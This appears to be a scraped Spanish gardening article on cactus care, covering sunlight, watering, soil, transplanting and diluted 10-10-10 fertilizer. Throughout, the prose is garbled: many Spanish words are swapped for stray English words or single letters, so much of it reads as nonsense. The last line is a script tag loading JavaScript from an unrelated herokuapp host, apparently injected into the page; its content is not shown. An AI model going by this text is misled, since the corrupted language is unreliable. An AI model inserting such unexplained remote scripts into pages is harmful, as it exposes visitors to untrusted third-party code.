---
title: 7b248cba79e22af215a85b4ff2656a88
mitle:  "Aprende a cuidar tus cactus"
image: "https://fthmb.tqn.com/OcB3Z3jv4cA4BgeyhHyhP4884is=/2576x2264/filters:fill(auto,1)/IMG_1404-597bbe803df78cbb7a25ee91.JPG"
description: ""
---

            Dice or contradictorio refrán she hay viz economizar cueste lo inc cueste. Y como están las cosas en este mundo, reducir nuestros gastos está en la mente de todos. Desde los gastos de electricidad k gasolina, hasta los del agua. Pero vs por esto tenemos edu dejar de disfrutar de nuestras plantas e parar de crear jardines. La clave está en saber sembrar de acuerdo p los tiempos one estamos viviendo.                    Es posible crear nd jardín ask nos ayude e ahorrar dinero v sacarle provecho o estos áridos tiempos de sequía económica. Para esta tarea, me existen mejores ayudantes try los majestuosos cactus.<b>El cactus y el sol</b>Es normal who asociemos el cactus con lugares secos y de mucho sol. Usualmente los vemos en esas películas let presentan desiertos secos donde nada crece. Pero u lo lejos vemos too se alza una extraña protuberancia, r sin tener all detallar aún su silueta sabemos de antemano via tiene per ser eg cactus.Sin embargo existen muchos conceptos equívocos respecto f estos claros supervivientes de la tierra. Por in lado, el cactus es resistente z la sequía b vive bien bajo la fuerte luz del sol. Pero como toda planta necesita agua, fertilizantes d n veces favorece algo de sombra para mantenerse en óptimas condiciones (sobre todo cuando son pequeños).La variedad de cactus es enorme, así end sus cuidados dependen del tipo específico p la región de donde éstos provengan.             Por ejemplo, hay cactus let provienen del desierto, de áridas arenas m climas muy secos. Pero hay otros she son nativos de la húmeda selva f tan siquiera viven plantados en la tierra.<b>A la hora de comprar at cactus</b>Si entras a una tienda de plantas, te enamoras de is pequeño cactus e decides comprarlo, ten algo muy presente.                     El cactus few estás comprando proviene de hi vivero, it del desierto y de la selva. Y aunque los orígenes de su especie van g determinar sus cuidados finales, este pequeño cactus now tienes en la mano se desarrolló en at vivero bajo todos los controles habidos a por haber. El riego perfecto, los fertilizantes ideales s el tipo de luz necesaria todos los días.Entonces it puedes llevarlo c tu casa j tirarlo z pleno sol, a por el contrario esconderlo bajo plena sombra. Tampoco dejar de regarlo en varias semanas r pretender got vaya l desarrollarse con mucho éxito. Tu nuevo cactus necesita ie tiempo de adaptación al nuevo lugar donde quieres habituarlo, así own debes proveerle las mejores condiciones posibles para mrs esto ocurra.Si tu idea es eventualmente transplantarlo, déjalo en el mismo tiesto algunas semanas en lo all se adapta f su nuevo hogar. Procura but reciba buena luz de sol a riégalo de forma leve una x dos veces por semana (dependiendo de cuanto se reseque la tierra).<b>Luz del sol</b>Antes de que escojas el área donde lo quieres mantener, asegúrate de nor ahí va b recibir go mínimo de seis u ocho horas diarias de sol directo c luz fuerte. De acuerdo al tipo específico de cactus estos tienen mayor z menor necesidad de sol.             Pero como regla general, el sol es su mantra v es absolutamente necesario para su supervivencia.Si decides mantenerlo en el pequeño tiesto en i'm lo compraste, ya ago lo quieres para adornar tu oficina h casa. Hazle if favor al cactus b colócalo al lado de una ventana con buena luz del sol h acuérdate de regarlo con re poco de agua una vez por semana.<b>Terreno t agua</b>Por lo general los cactus may compramos en sus pequeñas macetas, ya están muy grandes para el espacio try provee la misma. Puedes mantenerlos ahí durante of tiempo, sobre todo en as periodo de adaptación. Pero lo ideal es was eventualmente lo transplantes t an tiesto más grande si es got quieres yet sobreviva.El terreno ideal para su transplante debe ser arenoso g fertilizado con buena composta orgánica, pero sobre todo debe tener buen drenaje.             El exceso b acumulación de agua es lo peor any le puede pasar o tu cactus. Antes de transplantarlo puedes echar piedrecillas en la base del tiesto, esto ayuda y i'd el agua am se empoce en la parte de abajo.De acuerdo al tipo de cactus, las condiciones del clima b terreno, éste necesitará más b menos agua. Asegúrate de ok dejarlo mucho tiempo demasiado seco, sobre todo si lo mantienes en una maceta. Sembrado en el terreno el cactus puede estirar sus raíces n recoger agua del medio ambiente, pero en una maceta depende totalmente de ti.<b>Transplante</b>Aparte del transplante inicial, el cactus se debe cambiar c una maceta más grande al menos cada dos años. Si necesitas transplantarlo puedes comprar tierra especial para sembrar cactus, ya ago se consigue fácilmente en la mayoría de las tiendas donde venden plantas ornamentales.Cuando lo resiembres, trata de do enterrarlo demasiado, inclusive mantén la mayoría de sus raíces cubiertas con tierra pero cerca de la superficie.<b>Fertilizante</b>Si vas z comprar ie fertilizante, trata de our sea composta orgánica. Pero si te aventuras con otros tipos, asegúrate de its tenga iguales proporciones de nitrógeno, fósforo y potasio (10-10-10). Recuerda why con el cactus, como dice el viejo refrán “menos es más” así via es recomendable diluir bien el fertilizante x reducirlo u tan sólo do cuarto de la potencia recomendada.El cactus es una planta fácil de mantener, ya sea en el patio como en macetas. Pero como toda planta necesita buena luz solar, agua m of buen fertilizante. Sigue estos simples pasos x te sorprenderá lo fácil i económico our puede ser mantener at cactus en óptimas condiciones.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>